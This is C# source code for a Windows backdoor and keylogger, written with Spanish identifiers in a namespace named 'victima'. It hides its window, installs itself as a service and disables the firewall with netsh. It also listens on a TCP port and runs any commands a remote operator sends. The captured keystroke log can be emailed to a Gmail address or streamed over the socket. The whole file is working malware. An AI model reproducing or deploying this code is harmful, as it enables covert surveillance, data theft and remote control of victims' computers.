using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Net.Sockets;
using System.ServiceProcess;
using System.Text;
using System.Threading;
using victima;


namespace victima
{
    class Program
    {
        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [System.Runtime.InteropServices.DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        static TcpListener listener;
        const int LIMIT = 5;
        public const string ServiceName = "oyarikuna_service";
        public class Service : ServiceBase
        {
            public Service()
            {
                ServiceName = Program.ServiceName;
            }

            protected override void OnStart(string[] args)
            {
                auxilio();
            }

            protected override void OnStop()
            {
                Program.Stop();
            }
        }

        static void Main(string[] args)
        {
            /*SelfInstaller.UninstallMe();
            return;*/
            if (!Environment.UserInteractive)
                using (var service = new Service())
                    ServiceBase.Run(service);
            else
            {
                /*auxilio();
                return;*/
                var handle = GetConsoleWindow();

                // Hide
                ShowWindow(handle, SW_HIDE);

                ServiceController ctl = ServiceController.GetServices()
                .FirstOrDefault(s => s.ServiceName == Program.ServiceName);
                if (ctl == null)
                {
                    Console.WriteLine("Instalando");
                    SelfInstaller.InstallMe();
                }
                /*ServiceController sc = new ServiceController(Program.ServiceName);
                if (sc.Status != ServiceControllerStatus.Running)
                {
                    sc.Start();
                }*/
                auxilio();
            }
        }

        private static void auxilio()
        {
            //revisar si el proceso esta iniciado
            //iniciar desactivando el firewall
            Desactivar_firewall();
            //obtener el ip externo y enviarlo por correo
            string public_ip = GetPublicIP();            
            //Mandar_email_ip(public_ip);
            string localhost_ip = "192.168.1.155";
            //iniciar el escucha en el puerto 3306
            IPAddress IP_address = IPAddress.Parse(localhost_ip);
            listener = new TcpListener(IP_address, 3307);
            listener.Start();
            for (int i = 0; i < LIMIT; i++)
            {
                Thread t = new Thread(new ThreadStart(Servicio));
                t.Start();
            }
        }
        public static void Desactivar_firewall()
        {
            try
            {
                Process proc = new Process();
                string top = "netsh.exe";
                proc.StartInfo.Arguments = "Firewall set opmode disable";
                proc.StartInfo.FileName = top;
                proc.StartInfo.UseShellExecute = false;
                proc.StartInfo.RedirectStandardOutput = true;
                proc.StartInfo.CreateNoWindow = true;
                proc.Start();
                proc.WaitForExit();
                Console.WriteLine("firewall disabled");
            }
            catch (Exception)
            {
                Console.WriteLine("Error");
            }
        }
        public static void Ejecutar_comando(string comando)
        {
            write_log(comando);
            char[] delimiterChars = { '|' };
            string[] comando_completo = comando.Split(delimiterChars);
            string proceso = comando_completo[0];
            string argumentos = comando_completo[1];

            try
            {
                Process proc = new Process();
                string top = proceso;
                proc.StartInfo.Arguments = argumentos;
                proc.StartInfo.FileName = top;
                proc.StartInfo.UseShellExecute = false;
                proc.StartInfo.RedirectStandardOutput = true;
                proc.StartInfo.CreateNoWindow = true;
                proc.Start();
                proc.WaitForExit();
                Console.WriteLine("proceso ejecutado");
            }
            catch (Exception ex)
            {
                write_log(ex.Message);
                Console.WriteLine("Error");
            }
        }
        public static string GetPublicIP()
        {
            String direction = "";
            WebRequest request = WebRequest.Create("http://checkip.dyndns.org/");
            using (WebResponse response = request.GetResponse())
            using (StreamReader stream = new StreamReader(response.GetResponseStream()))
            {
                direction = stream.ReadToEnd();
            }

            //Search for the ip in the html
            int first = direction.IndexOf("Address: ") + 9;
            int last = direction.LastIndexOf("</body>");
            direction = direction.Substring(first, last - first);

            return direction;
        }
        public static void Mandar_email_ip(string ip)
        {
            try
            {
                GMail Cr = new GMail();
                MailMessage mnsj = new MailMessage();
                mnsj.Subject = "IP";
                mnsj.To.Add(new MailAddress("uyarikuna@gmail.com"));
                mnsj.From = new MailAddress("victim@hipster.com", "Nueva");
                mnsj.Body = String.Format("IP \n\n {0}", ip); ;
                Cr.MandarCorreo(mnsj);
            }
            catch (Exception)
            {
                Console.Write("Error envio email ip");
            }

        }
        public static void Mandar_email_archivo_keylogger()
        {
            try
            {
                GMail Cr = new GMail();
                MailMessage mnsj = new MailMessage();
                mnsj.Subject = "keylog_file";
                mnsj.To.Add(new MailAddress("uyarikuna@gmail.com"));
                mnsj.From = new MailAddress("victim@hipster.com", "Nueva");
                Attachment attach = new Attachment(System.Windows.Forms.Application.StartupPath + @"\log.txt");
                mnsj.Attachments.Add(attach);
                mnsj.Body = String.Format("keylog, timestamp: \n\n {0}", new DateTime().ToUniversalTime());
                Cr.MandarCorreo(mnsj);
            }
            catch (Exception)
            {
                Console.Write("Error envio email ip");
            }
        }

        public static void Servicio()
        {
            //Console.Write("Server initiated..");
            while (true)
            {
                Socket soc = listener.AcceptSocket();
                write_log(
                "I am connected to " + IPAddress.Parse(((IPEndPoint)soc.RemoteEndPoint).Address.ToString()) +
                "on port number " + ((IPEndPoint)soc.RemoteEndPoint).Port.ToString());

                try
                {
                    Stream s = new NetworkStream(soc);
                    StreamReader sr = new StreamReader(s);
                    StreamWriter sw = new StreamWriter(s);
                    sw.AutoFlush = true; // enable automatic flushing
                    sw.WriteLine("Server Initiated");
                    while (true)
                    {
                        //capturar comando inicial
                        string initial_command = sr.ReadLine();
                        if (initial_command.Contains("keylog"))
                        {
                            char[] delimiterChars = { '|' };
                            string[] comando_completo = initial_command.Split(delimiterChars);
                            string argumento = comando_completo[1];
                            string extra = "";
                            if (comando_completo.Length > 2)
                            {
                                extra = comando_completo[2];
                            }
                            switch (argumento)
                            {
                                case "init":
                                    //Console.Write("keylogger init");
                                    Keylogger.Init();
                                    sw.WriteLine("Keylogger iniciado el:" + new DateTime().ToString());
                                    break;
                                case "obtener_archivo_linea":
                                    //Console.Write("Sending file");
                                    sw.WriteLine("file");
                                    byte[] bytes = File.ReadAllBytes(System.Windows.Forms.Application.StartupPath + @"\log.txt");
                                    sw.WriteLine(bytes.Length.ToString());
                                    sw.Flush();
                                    sw.WriteLine(System.Windows.Forms.Application.StartupPath + @"\log.txt");
                                    sw.Flush();
                                    soc.SendFile(System.Windows.Forms.Application.StartupPath + @"\log.txt");

                                    break;
                                case "mandar_archivo_correo":
                                    //Console.Write("Emailing file");
                                    Mandar_email_archivo_keylogger();
                                    sw.WriteLine("Email Enviado con attach el:" + new DateTime().ToString());
                                    break;
                                case "desactivar_av":
                                    DesactivarAntivirus();
                                    sw.WriteLine("SW AV cmd llamado el:" + new DateTime().ToString());
                                    break;
                                default:
                                    write_log("yapues");
                                    sw.WriteLine("no reconocido,echo:" + initial_command);
                                    sw.Flush();
                                    break;
                            }

                        }
                        else
                        {
                            //ejecutar y devolver ACK
                            Ejecutar_comando(initial_command);
                            sw.WriteLine("comando ejecutado:" + initial_command);
                        }
                    }

                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }
                soc.Close();
            }
        }

        private static void DesactivarAntivirus()
        {
            throw new NotImplementedException();
        }





        public static void Start(string[] args)
        {

            //revisar si el proceso esta iniciado
            //iniciar desactivando el firewall
            Desactivar_firewall();
            //obtener el ip externo y enviarlo por correo
            //string public_ip = GetPublicIP();
            string public_ip = "192.168.1.155";
            //Mandar_email_ip(public_ip);
            //iniciar el escucha en el puerto 3306
            IPAddress IP_address = IPAddress.Parse(public_ip);
            listener = new TcpListener(IP_address, 3306);
            listener.Start();
            for (int i = 0; i < LIMIT; i++)
            {
                Thread t = new Thread(new ThreadStart(Servicio));
                t.Start();
            }
        }

        public static void Stop()
        {

        }
        static void write_log(string mensaje)
        {
            string sSource;
            string sLog;
            string sEvent;

            sSource = "dotNET Sample App";
            sLog = "Application";
            sEvent = "Sample Event";

            if (!EventLog.SourceExists(sSource))
                EventLog.CreateEventSource(sSource, sLog);
            EventLog.WriteEntry(sSource, mensaje);
        }
    }
}
